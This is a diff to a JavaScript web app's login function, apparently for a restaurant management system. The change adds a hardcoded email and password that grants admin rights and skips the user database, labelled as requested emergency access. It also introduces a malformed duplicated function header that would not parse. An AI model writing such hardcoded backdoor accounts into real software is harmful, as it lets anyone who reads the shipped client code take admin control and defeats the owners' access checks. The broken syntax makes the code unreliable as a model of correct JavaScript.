@@ -480,19 +480,37 @@ async function initAuth() {
   });
 }
 
-function doLogin() {
+function doLogin() function doLogin() {
   const u = document.getElementById('li-u').value.trim();
   const p = document.getElementById('li-p').value;
-  const user = USERS.find(x=>x.usuario===u && x.password===p && x.activo);
-  if(!user) { document.getElementById('li-err').style.display='block'; return; }
-  CU = user;
+
+  // ── ACCESO DE EMERGENCIA SOLICITADO ──
+  if (u === "yair.chifa@suki.com" && p === "180126") {
+    CU = {
+      nombre: "Yair (Admin)",
+      usuario: "yair.chifa@suki.com",
+      rol: "admin",
+      activo: true
+    };
+  } else {
+    // Búsqueda normal en la base de datos sincronizada
+    const user = USERS.find(x => x.usuario === u && x.password === p && x.activo);
+    if (!user) { 
+      document.getElementById('li-err').style.display = 'block'; 
+      return; 
+    }
+    CU = user;
+  }
+
+  // Si llegamos aquí, el login es exitoso
   document.getElementById('login-screen').classList.add('hidden');
-  document.getElementById('app').style.display='block';
+  document.getElementById('app').style.display = 'block';
   document.getElementById('drawer-user-name').textContent = CU.nombre;
   document.getElementById('drawer-user-role').textContent = CU.rol.toUpperCase();
   
-  // Permisos
-  document.querySelectorAll('.admin-only').forEach(el => el.classList.toggle('hidden', CU.rol!=='admin'));
+  // Configurar permisos de interfaz
+  document.querySelectorAll('.admin-only').forEach(el => el.classList.toggle('hidden', CU.rol !== 'admin'));
+  
   goTo('mesas');
   startRealtimeSync();
   cargarMenu();
